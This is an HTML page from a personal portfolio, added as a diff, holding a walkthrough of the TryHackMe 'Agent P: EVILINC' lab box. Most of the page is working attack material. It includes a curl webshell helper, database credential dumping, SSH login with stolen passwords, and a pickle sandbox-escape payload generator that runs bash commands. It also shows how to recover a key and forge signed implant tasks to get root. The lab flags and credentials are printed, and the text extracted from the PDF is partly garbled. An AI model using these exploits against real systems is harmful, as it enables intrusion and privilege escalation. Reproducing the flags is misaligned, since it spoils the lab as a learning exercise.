@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent P: EVILINC // writeup</title>
+    <meta name="description" content="Web and API enumeration against the EVILINC target, chaining the exposed endpoints into an authenticated foothold and escalating to the flag.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Agent P: EVILINC</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web / API</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-08</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / API / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> agentp-evilinc-walkthrough.md</span>
+                </div>
+                <p class="writeup-summary">Web and API enumeration against the EVILINC target, chaining the exposed endpoints into an authenticated foothold and escalating to the flag.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/agentp-evilinc-walkthrough.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="agentp-evilinc-walkthrough.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>EVILINC — &quot;Agent P&quot; Boot2Root Walkthrough</h1>
+<h2>Session writeup: WordPress RCE → norm → vanessa → root | Target: http://10.49.139.112 (host: tryhackme-2404)</h2>
+<h3>This document details the full exploitation of the EVILINC box (Doofenshmirtz Evil Incorporated, from Phineas and Ferb) at http://10.49.139.112 — a WordPress 6.9 host on Ubuntu 24.04 (hostname tryhackme-2404, kernel 7.0.0-1010-aws). Three flags were obtained: user (norm), operator (vanessa) and root. The path is: unauthenticated WordPress RCE (wp2shell) → read DB creds → SSH as norm (user flag) → read operator secret → restricted-pickle sandbox escape on the -inator Control Panel (operator flag) → reverse the root implant&#39;s homegrown crypto → forge a signed C2 task → root flag. Public services: 22/tcp OpenSSH 9.6p1, 80/tcp Apache 2.4.58. Internal loopback service: gunicorn (Flask) on 127.0.0.1:8700 — the “-inator Control Panel”. Unix socket /run/evilinc/tasking.sock — the C2 tasking queue (root + vanessa).</h3>
+<h1>2. All Secrets / Key Values</h1>
+<p>Item Value WP DB user / pass wpuser / wp_WjURfdI (database: wordpress) WP admin (created by wp2_88ff51b38aa8 / Wp2!2dGCLZf3aqnU6B-GBrlO wp2shell) SSH norm norm / N0rm_th3_r0b0t_2026 (group: norm, evilinc) Operator secret b3hind_sch3dul3_th1s_m0nth (panel.conf) Operator token cookie ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef 3f9 /etc/machine-id ec237b10a5f6e959a3088340f9904b31 Implant rodata blob 1588c57c026ae5eb9c2d1817af48f70964efff765e58d112d8f116d70f994 @0x2020 1b4 LCG seed / mul / inc 0x1a2b3c4d / 0x41c64e6d / 0x3039, byte = (x&gt;&gt;16)&amp;0xff Derived C2 task MAC KEY aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483 319 Users / groups norm (uid 1001, evilinc 1001), vanessa (uid 1002, evilinc), ubuntu (1000); www-data (33)</p>
+<p>User EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t} /home/norm/u ser.txt Opera EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s} /home/vaness tor a/operator.t xt page 1</p>
+<p>Root EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n} /root/root.t xt page 2</p>
+<h1>4. Stage 0 — Foothold Recap (previous session)</h1>
+<h3>Work from the earlier session (kept here for completeness): Webshell endpoint: Convenience helper used throughout the session (URL-encodes the command):</h3>
+<p>ws() { curl -s -m 25 &quot;http://10.49.139.112/wp-content/plugins/shellplug/shellplug.php?c=$(p ython3 -c &quot;import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))&quot; &quot;$1&amp;qu; ot;)&quot;; }</p>
+<h1>5. Stage B — WordPress DB → SSH as norm → USER FLAG</h1>
+<h2>5.1 Database credentials from wp-config.php</h2>
+<p>ws &#39;cat /var/www/html/wp-config.php&#39;   # DB_NAME=wordpress, DB_USER=wpuser, DB_PASSWOR D=wp_WjURfdI</p>
+<h2>5.2 Discover wp_infra_accounts table</h2>
+<p>ws &quot;mysql -uwpuser -pwp_WjURfdI -e &#39;use wordpress; show tables;&#39;&quot; Tables_in_wordpress: wp_commentmeta wp_comments wp_infra_accounts wp_links wp_options wp_postmet a wp_posts wp_term_relationships wp_term_taxonomy wp_termmeta wp_terms wp_usermeta wp_users ws &quot;mysql -uwpuser -pwp_WjURfdI -e &#39;use wordpress; describe wp_infra_accounts; select</p>
+<ul><li>from wp_infra_accounts;&#39;&quot;</li></ul>
+<p>host_user | host_pass             | note norm      | N0rm_th3_r0b0t_2026        | ssh sync targe t for the -inator newsletter cron</p>
+<h2>5.3 SSH as norm</h2>
+<p>import paramiko c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy() ) c.connect(&quot;10.49.139.112&quot;, username=&quot;norm&quot;, password=&quot;N0rm_th3_r0b0t_ 2026&quot;) stdin, stdout, stderr = c.exec_command(cmd) print(stdout.read().decode()); c.close()</p>
+<h3>norm is a member of the evilinc group → can read the panel config:</h3>
+<pre class="code-block" data-lang="bash"><code>$ id</code></pre>
+<p>uid=1001(norm) gid=1002(norm) groups=1002(norm),1001(evilinc)</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /etc/evilinc/panel.con</code></pre>
+<pre class="code-block" data-lang="bash"><code>[panel]</code></pre>
+<p>operator_secret = b3hind_sch3dul3_th1s_m0nth</p>
+<h2>5.4 User flag</h2>
+<pre class="code-block" data-lang="bash"><code>$ cat /home/norm/user.txt</code></pre>
+<p>EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t} page 3</p>
+<h1>6. Stage C — Operator flag (vanessa) via pickle sandbox escape</h1>
+<h3>The -inator Control Panel listens on loopback (gunicorn as vanessa, /usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app, WorkingDirectory /var/www/evilinc-panel).</h3>
+<h2>6.1 Login and cookie</h2>
+<p>curl -s -c /tmp/cj.txt -X POST http://127.0.0.1:8700/api/login -d &#39;secret=b3hind_sch3dul3_t h1s_m0nth&#39; # =&gt; {&quot;ok&quot;:true}  + Set-Cookie: op_token=ce73de7cfa02d80495a882bd28 191d3bf38e4c0bf03635451ae6b9f9fefef3f9</p>
+<h3>All API calls below were executed through the webshell (as www-data) with the cookie jar, or directly as vanessa after RCE.</h3>
+<h2>6.2 Endpoints 6.3 The leaky restricted unpickler</h2>
+<p>gASVRgAAAAAAAAB9lCiMBG5hbWWUjA5Nb250aGx5IERpZ2VzdJSMCHNlY3Rpb25zlF2UKIwFaW50cm+UjAdzY2hlbWVzlIwF b3V0cm+UZXUu   # sample blueprint (base64)</p>
+<h3>Attempting a classic builtins RCE leaks the module blocklist:</h3>
+<p>POST /api/blueprints/import  blueprint=&lt;base64 of pickle with builtins.eval/<strong>reduce</strong>&gt; # =&gt; {&quot;error&quot;:&quot;import failed: blueprint references a blocked module: &#39;built ins&#39;&quot;,&quot;ok&quot;:false}</p>
+<h3>Allowlist probing — a bare pickle that is just GLOBAL module\nattr\n + STOP (“cMODULE\nATTR\n.”) is loaded and repr’d when allowed:</h3>
+<p>b64 = base64.b64encode(b&#39;c&#39; + module + b&#39;\n&#39; + attr + b&#39;\n.&#39;).deco de() # ALLOWED: io.BytesIO, io.open, pickle.Unpickler, <em>pickle.load, </em>pickle.Unpickler, #   func tools.partial/reduce, codecs.encode, <em>codecs.encode, collections.*, copyreg.*, #   types.Functio nType/CodeType/SimpleNamespace, marshal.loads, threading.Thread, #   json/re/string/urllib.parse /html/time/datetime/pathlib/ntpath/array/struct/zipfile, #   base64.b64decode, binascii.unhexlif y, weakref.ref, signal.signal, app.app, werkzeug.run</em>simple # BLOCKED: builtins, os, posix, subp rocess, sys, operator, importlib, numpy</p>
+<h2>6.4 Sandbox escape — nested unrestricted unpickle</h2>
+<h3>Construct an outer pickle that only uses allowed globals: <em>pickle.load(io.BytesIO(inner)). The inner bytes are passed as a BINBYTES constant (never inspected by the outer loader) and are then executed by the plain C “load”, which permits everything. Note: Python 3.12/3.13 removed the GETATTR opcode, so “Unpickler(...).load()” chaining is not available; </em>pickle.load takes a file object directly.</h3>
+<p>opcodes: \x80\x04                    # PROTO 4 c_pickle\nload\n            # GLOBAL <em>pickle.load cio\nBytesIO\n              # GLOBAL io.BytesIO B + &lt;u32 LE length&gt; + inner # BINBYTES (o pcode &#39;B&#39; = 0x42, NOT &#39;C&#39;/SHORT</em>BINBYTES) \x85 R                      # TUPL page 4</p>
+<p>E1 (arg must be a tuple for REDUCE), REDUCE -&gt; BytesIO(inner) \x85 R .                    # T UPLE1, REDUCE -&gt; _pickle.load(buf) ; STOP</p>
+<h3>Payload generator used for every vanessa command (mkcmd.py):</h3>
+<p>import pickle, struct, base64, sys cmd = sys.argv[1] class R: def <strong>reduce</strong>(self): import subprocess return (subprocess.check_output, ([&#39;bash&#39;, &#39;-c&#39;, c md],)) inner = pickle.dumps(R()) s = bytearray(b&#39;\x80\x04&#39;) s += b&#39;c_pickle\nload \n&#39; s += b&#39;cio\nBytesIO\n&#39; s += b&#39;B&#39; + struct.pack(&#39;&lt;I&#39;, l en(inner)) + inner s += b&#39;\x85R\x85R.&#39; print(base64.b64encode(bytes(s)).decode()) ws &quot;curl -s -b /tmp/cj.txt -X POST http://127.0.0.1:8700/api/blueprints/import --data-urlen code blueprint=$B64&quot;</p>
+<h3>Full base64 payload used to confirm RCE (id &amp;&amp; ls -la /tmp | head -20):</h3>
+<p>gARjX3BpY2tsZQpsb2FkCmNpbwpCeXRlc0lPCkJlAAAAgASVWgAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19v dXRwdXS Uk5RdlCiMBGJhc2iUjAItY5SMJGlkOyBlY2hvID09PTsgbHMgLWxhIC90bXAgfCBoZWFkIC0yMJRlhZRS lC6FUoVSLg==</p>
+<h3>Response — RCE as vanessa:</h3>
+<p>{&quot;loaded&quot;:&quot;b&#39;uid=1002(vanessa) gid=1003(vanessa) groups=1003(vanessa),1001(e vilinc)\\n===...&quot;</p>
+<h3>Note: the import response reflects repr(obj)[:200], so command output comes back truncated to ~200 chars. Long files were read in 90-char chunks with: tail -c +N &lt;file&gt; | head -c 90</h3>
+<h2>6.5 Operator flag</h2>
+<pre class="code-block" data-lang="bash"><code>$ ls -a1 /home/vanessa</code></pre>
+<p>. .. .bash_history .bash_logout .bashrc .cache .gunicorn .profile .ssh .v iminfo operator.txt</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /home/vanessa/operator.txt</code></pre>
+<p>EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s } page 5</p>
+<h1>7. Stage D — Root flag: reverse the implant, forge a signed C2 task</h1>
+<h3>Systemd services (world-readable) reveal the attack surface:</h3>
+<p>evilinc-c2.service:      root  /usr/bin/python3 /opt/evilinc/c2/tasking_server.py  (RuntimeDirec tory=evilinc) evilinc-implant.service: root  /opt/evilinc/implant   (After/Requires evilinc-c2.s ervice, Restart=always) evilinc-heartbeat.service: root /usr/bin/python3 /opt/evilinc/c2/heartbe at.py evilinc-panel.service:    vanessa gunicorn 127.0.0.1:8700  (EIC_PANEL_CONF=/etc/evilinc/pa nel.conf)</p>
+<h3>/run/evilinc/tasking.sock is srw-rw---- root:vanessa → the implant (root) polls it and the C2 (root) answers. vanessa (and root) can connect to it.</h3>
+<h2>7.1 Download and reverse the implant</h2>
+<pre class="code-block" data-lang="bash"><code>$ ws &#39;base64 /opt/evilinc/implant&#39; &gt; implant.b64 &amp;&amp; python3 -c &quot;import</code></pre>
+<p>base64; open(&#39;/tmp/opencode/implant&#39;,&#39;wb&#39;).write(base64.b64decode(open(I 7;implant.b64&#39;).read().replace(&#39;\n&#39;,&#39;&#39;)))&quot;</p>
+<pre class="code-block" data-lang="bash"><code>$ file implant</code></pre>
+<p>ELF 64-b it LSB pie executable, x86-64, dynamically linked, stripped (14472 bytes)</p>
+<pre class="code-block" data-lang="bash"><code>$ strings -n 5 implant</code></pre>
+<h2>7.2 Protocol from the disassembly (objdump -d -M intel) 7.3 Recover the task MAC key</h2>
+<p>import hashlib, hmac seed = 0x1a2b3c4d blob = bytes.fromhex(&quot;1588c57c026ae5eb9c2d1817af48f7 0964efff765e58d112d8f116d70f9941b4&quot;) x = seed; lcg = bytearray() for i in range(32): x = (x * 0x41c64e6d + 0x3039) &amp; 0xffffffff lcg.append((x &gt;&gt; 16) &amp; 0xff) K   = by tes(a ^ b for a, b in zip(lcg, blob)) KEY = hmac.new(K, b&quot;ec237b10a5f6e959a3088340f9904b31&amp; quot;, hashlib.sha256).digest() print(K.hex()) print(KEY.hex()) K   = 4310b28058bce65bdba3a78f86105499694d8b8a105e24967899db58d64a7634 KEY = aa3e4980d20530450df 2e4807cddc7a66f8391b79df9faaacde58b75bb483319</p>
+<h2>7.4 Verify the key against live C2 traffic</h2>
+<h1>connect to the socket as vanessa, send a POLL, read queued tasks import socket s = socket.sock et(socket.AF_UNIX, socket.SOCK_STREAM); s.connect(&quot;/run/evilinc/tasking.sock&quot;) s.senda ll(b&quot;POLL 1\n&quot;); print(s.recv(65536)) # =&gt; b&#39;10|sysinfo|uptime|1000|2b33d3bf90 page 6</h1>
+<p>540c999ecd917150e514240cc02cef3cd4fece3486790681103718\n #    20|sysinfo|uptime|1001|0f9e75af082 404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f\n&#39; hmac.new(KEY, b&quot;10|sysinfo|uptime|1000&quot;, hashlib.sha256).hexdigest() # =&gt; 2b33d3bf9 0540c999ecd917150e514240cc02cef3cd4fece3486790681103718  (MATCH) hmac.new(KEY, b&quot;20|sysinfo |uptime|1001&quot;, hashlib.sha256).hexdigest() # =&gt; 0f9e75af082404418e7eced42503f98b4a048591 a242e7ef73a6627d60c2e54f  (MATCH)</p>
+<h2>7.5 Discover the SUBMIT verb</h2>
+<h1>brute a list of verbs against the socket ADD =&gt; ERR unknown verb QUEUE =&gt; ERR un known verb TASK =&gt; ERR unknown verb SUBMIT =&gt; ERR expected id|type|cmd|nonce|sig &lt;-- THE verb ENQUEUE =&gt; ERR unknown verb (etc.)</h1>
+<h2>7.6 Forge and submit a root task</h2>
+<p>def sig(msg): return hmac.new(KEY, msg.encode(), hashlib.sha256).hexdigest() task = &quot;99999| exec|id &gt; /tmp/rce_test.txt 2&gt;&amp;1 &amp;&amp; echo ROOT_OK &gt;&gt; /tmp/rce_test.txt|42 4242&quot; print(&quot;SUBMIT &quot; + task + &quot;|&quot; + sig(task)) SUBMIT 99999|exec|id &gt; /tmp/rce_test.txt 2&gt;&amp;1 &amp;&amp; echo ROOT_OK &gt;&gt; /tmp/rc e_test.txt|424242|f4bb7b756b4cc5d83033206f6deaf5b72874509e0166cf17f13557f90a49f5ef # first attempt with small id failed: ERR id must exceed current max   (use large ids) # accepte d: response b&#39;OK\n&#39;; the root implant polls every 3 s and executes the task</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /tmp/rce_test.txt</code></pre>
+<p>uid=0(root) gid=0(root) groups=0(root) ROOT_OK</p>
+<h2>7.7 Root flag</h2>
+<p>SUBMIT 100000|exec|cat /root/root.txt &gt; /tmp/rf.txt &amp;&amp; chmod 644 /tmp/rf.txt|424243|0 adfccf9bc4b73c355dd023ec9d740b8978a0790ffa873de9b5ea274a800e852</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /tmp/rf.txt</code></pre>
+<p>EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n} page 7</p>
+<h1>8. Key files / artifacts 9. Author-side notes gleaned from the box</h1>
+<p>Writeup generated from the exploitation session. All payloads, responses and flags are verbatim from the engagement. page 8</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/agentp-evilinc-walkthrough.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="agentp-evilinc-walkthrough.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
